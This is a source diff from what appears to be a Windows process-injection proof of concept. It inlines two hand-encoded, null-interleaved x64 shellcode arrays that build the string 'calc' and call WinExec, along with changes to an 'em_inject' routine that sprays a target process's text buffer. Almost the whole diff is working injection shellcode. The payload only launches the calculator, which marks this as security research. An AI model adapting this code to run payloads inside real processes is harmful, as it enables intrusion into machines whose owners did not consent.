@@ -1,4 +1,31 @@
+/**
+  Copyright © 2020 Odzhan. All Rights Reserved.
 
+  Redistribution and use in source and binary forms, with or without
+  modification, are permitted provided that the following conditions are
+  met:
+
+  1. Redistributions of source code must retain the above copyright
+  notice, this list of conditions and the following disclaimer.
+
+  2. Redistributions in binary form must reproduce the above copyright
+  notice, this list of conditions and the following disclaimer in the
+  documentation and/or other materials provided with the distribution.
+
+  3. The name of the author may not be used to endorse or promote products
+  derived from this software without specific prior written permission.
+
+  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
+  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
+  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
+  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
+  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
+  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
+  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
+  POSSIBILITY OF SUCH DAMAGE. */
 
 #include <stdint.h>
 #include <stdio.h>
@@ -161,7 +188,7 @@ char STORE_BYTE[] = {
   /* 0006 */ "\x00\x5d\x00"         /* add   byte [rbp], cl  */
 };
 
-// Transfers control of execution to kernel32!WinExec
+// Transfers control of execution to address on the stack
 #define RET_SIZE 2
 
 char RET[] = {
@@ -169,13 +196,126 @@ char RET[] = {
   /* 0002 */ "\x00"
 };
 
-#define RET_OFS2 0x18 + 2
-
-#include "calc4.h"
-
+#define CALC3_SIZE 164
 #define RET_OFS 0x20 + 2
 
-#include "calc3.h"
+char CALC3[] = {
+  /* 0000 */ "\xb0\x00"                 /* mov   al, 0                 */
+  /* 0002 */ "\xc8\x00\x01\x00"         /* enter 0x100, 0              */
+  /* 0006 */ "\x55"                     /* push  rbp                   */
+  /* 0007 */ "\x00\x45\x00"             /* add   byte [rbp], al        */
+  /* 000A */ "\x6a\x00"                 /* push  0                     */
+  /* 000C */ "\x54"                     /* push  rsp                   */
+  /* 000D */ "\x00\x45\x00"             /* add   byte [rbp], al        */
+  /* 0010 */ "\x5d"                     /* pop   rbp                   */
+  /* 0011 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0014 */ "\x57"                     /* push  rdi                   */
+  /* 0015 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0018 */ "\x56"                     /* push  rsi                   */
+  /* 0019 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 001C */ "\x53"                     /* push  rbx                   */
+  /* 001D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0020 */ "\xb8\x00\x4d\x00\xff"     /* mov   eax, 0xff004d00       */
+  /* 0025 */ "\x00\xe1"                 /* add   cl, ah                */
+  /* 0027 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 002A */ "\xb8\x00\x01\x00\xff"     /* mov   eax, 0xff000100       */
+  /* 002F */ "\x00\xe5"                 /* add   ch, ah                */
+  /* 0031 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0034 */ "\x51"                     /* push  rcx                   */
+  /* 0035 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0038 */ "\x5b"                     /* pop   rbx                   */
+  /* 0039 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 003C */ "\x6a\x00"                 /* push  0                     */
+  /* 003E */ "\x54"                     /* push  rsp                   */
+  /* 003F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0042 */ "\x5f"                     /* pop   rdi                   */
+  /* 0043 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0046 */ "\x57"                     /* push  rdi                   */
+  /* 0047 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 004A */ "\x59"                     /* pop   rcx                   */
+  /* 004B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 004E */ "\x6a\x00"                 /* push  0                     */
+  /* 0050 */ "\x54"                     /* push  rsp                   */
+  /* 0051 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0054 */ "\x58"                     /* pop   rax                   */
+  /* 0055 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0058 */ "\xc7\x00\x63\x00\x6c\x00" /* mov   dword [rax], 0x6c0063 */
+  /* 005E */ "\x58"                     /* pop   rax                   */
+  /* 005F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0062 */ "\x35\x00\x61\x00\x63"     /* xor   eax, 0x63006100       */
+  /* 0067 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 006A */ "\xab"                     /* stosd                       */
+  /* 006B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 006E */ "\x6a\x00"                 /* push  0                     */
+  /* 0070 */ "\x54"                     /* push  rsp                   */
+  /* 0071 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0074 */ "\x58"                     /* pop   rax                   */
+  /* 0075 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0078 */ "\xc6\x00\x05"             /* mov   byte [rax], 5         */
+  /* 007B */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 007E */ "\x5a"                     /* pop   rdx                   */
+  /* 007F */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0082 */ "\x53"                     /* push  rbx                   */
+  /* 0083 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0086 */ "\x6a\x00"                 /* push  0                     */
+  /* 0088 */ "\x6a\x00"                 /* push  0                     */
+  /* 008A */ "\x6a\x00"                 /* push  0                     */
+  /* 008C */ "\x6a\x00"                 /* push  0                     */
+  /* 008E */ "\x6a\x00"                 /* push  0                     */
+  /* 0090 */ "\x53"                     /* push  rbx                   */
+  /* 0091 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0094 */ "\x90"                     /* nop                         */
+  /* 0095 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 0098 */ "\x90"                     /* nop                         */
+  /* 0099 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 009C */ "\x90"                     /* nop                         */
+  /* 009D */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+  /* 00A0 */ "\x90"                     /* nop                         */
+  /* 00A1 */ "\x00\x4d\x00"             /* add   byte [rbp], cl        */
+};
+
+#define CALC4_SIZE 79
+#define RET_OFS2 0x18 + 2
+
+char CALC4[] = {
+  /* 0000 */ "\x59"                 /* pop  rcx              */
+  /* 0001 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0004 */ "\x59"                 /* pop  rcx              */
+  /* 0005 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0008 */ "\x59"                 /* pop  rcx              */
+  /* 0009 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 000C */ "\x59"                 /* pop  rcx              */
+  /* 000D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0010 */ "\x59"                 /* pop  rcx              */
+  /* 0011 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0014 */ "\x59"                 /* pop  rcx              */
+  /* 0015 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0018 */ "\xb8\x00\x4d\x00\xff" /* mov  eax, 0xff004d00  */
+  /* 001D */ "\x00\xe1"             /* add  cl, ah           */
+  /* 001F */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0022 */ "\x51"                 /* push rcx              */
+  /* 0023 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0026 */ "\x58"                 /* pop  rax              */
+  /* 0027 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 002A */ "\xc6\x00\xc3"         /* mov  byte [rax], 0xc3 */
+  /* 002D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0030 */ "\x59"                 /* pop  rcx              */
+  /* 0031 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0034 */ "\x5b"                 /* pop  rbx              */
+  /* 0035 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0038 */ "\x5e"                 /* pop  rsi              */
+  /* 0039 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 003C */ "\x5f"                 /* pop  rdi              */
+  /* 003D */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0040 */ "\x59"                 /* pop  rcx              */
+  /* 0041 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 0044 */ "\x6a\x00"             /* push 0                */
+  /* 0046 */ "\x58"                 /* pop  rax              */
+  /* 0047 */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 004A */ "\x5c"                 /* pop  rsp              */
+  /* 004B */ "\x00\x4d\x00"         /* add  byte [rbp], cl   */
+  /* 004E */ "\x5d"                 /* pop  rbp              */
+};
 
 static
 u8* cp1252_generate_winexec(int pid, int *cslen) {
@@ -357,7 +497,8 @@ BOOL em_inject(void) {
       return FALSE;
     }
     
-    // loop until target buffer address is stable
+    // loop until target buffer address is stable and meets our criteria
+    // just spam the buufer until last 8-Bits are less than < calc3
     lastbuf.p = NULL;
     r = FALSE;
     
